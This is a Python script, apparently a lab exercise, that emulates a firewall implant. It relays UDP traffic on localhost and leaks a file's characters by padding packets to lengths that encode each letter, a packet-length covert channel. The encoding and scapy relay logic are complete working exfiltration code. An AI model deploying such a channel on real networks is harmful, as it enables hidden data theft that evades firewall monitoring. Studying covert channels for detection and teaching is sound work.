import socket
import time
import argparse
from random import randint as r
from scapy.all import *
from scapy.layers.inet import *

#Адрес сервера
SERVER_ADDRESS = ('localhost', 3162)

#Адрес firewall с закладкой
FIREWALL_ADDRESS = ('localhost', 3161)

CHANELL_ADDRESS = ('localhost', 3160)   # адрес Закладки

#Размер буфера для приема
BUFFER = 30000

#Мощность алфавита
LEN_ALFAVIT = 100


def min_packet_len(max_len, letter):
    return(max_len//LEN_ALFAVIT)* (ord(letter) - 30)


# прослушка и отправка сообщений
def listener(message):
    count = 0
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.bind(CHANELL_ADDRESS)
    while True:
        data, address = soc.recvfrom(BUFFER)
        if count == 0:
            max_len = get_max_len(data)
            soc.sendto(data, FIREWALL_ADDRESS)
            time.sleep(0.3)
        elif count == 1:
            packet_creation(data + b'\x00'*(len(message)-data.count(b'\x00')), address)
        elif count < len(message) + 2:
            min_pack_len = min_packet_len(max_len, message[count-2])
            print(min_pack_len)
            buffer = len(data)
            if len(data) > min_pack_len:
                while buffer > 0:
                    try:
                        packet_creation(data_change(message[count-2], data[:min_pack_len], max_len), address)
                        count+= 1
                        buffer -= min_pack_len
                        min_pack_len = min_packet_len(max_len, message[count-2])
                    except IndexError:
                        print('Сообщение отправлено')
                        packet_creation(data[min_pack_len:], address)

                try:
                    packet_creation(data_change(message[count-2], data, max_len), address)
                except IndexError:
                        print('Сообщение отправлено')
                        packet_creation(data[min_pack_len:], address)
            else:
                packet_creation(data_change(message[count-2], data, max_len), address)
                time.sleep(0.3)
        else:
            soc.sendto(data, FIREWALL_ADDRESS)
            time.sleep(0.3)
        count += 1



#Максимальная длина всегда у первого сообщения
def get_max_len(data):
    print(f'Первый пакет получен, максимальная длина сообщения в битах: {len(data)}')
    return (len(data))


#Получение аргументов
def parse_arguments():
    parser = argparse.ArgumentParser(description='Covert channel emulation')
    parser.add_argument('filename', type=str, default='file.txt')
    return parser.parse_args()


# Модификация сообщения
def data_change(char, data, max_len):
    #Получаем порядковый номер
    number = ord(char) - 30
    #Получаем нужную длину пакета
    packet_len = (max_len // LEN_ALFAVIT) * number + r(0, max_len // LEN_ALFAVIT - 1)
    byte_len = packet_len - (32 + len(data))  # длина заполнение нулями (32 - длина пакета udp)
    return (data + b'\x00' * byte_len)


# функция упаковки нового пакета с нужной длиной
def packet_creation(message, address):
    ip_header = IP(src=address[0], dst=FIREWALL_ADDRESS[0])
    #Адреса остаются те же
    udp_header = UDP(sport=address[1], dport=FIREWALL_ADDRESS[1])
    res_packet = ip_header / udp_header / Raw(message)
    send(res_packet)
    time.sleep(0.3)


if __name__ == '__main__':
    args = parse_arguments()
    file = open(args.filename)
    message = list(file.read())
    file.close()
    listener(message)
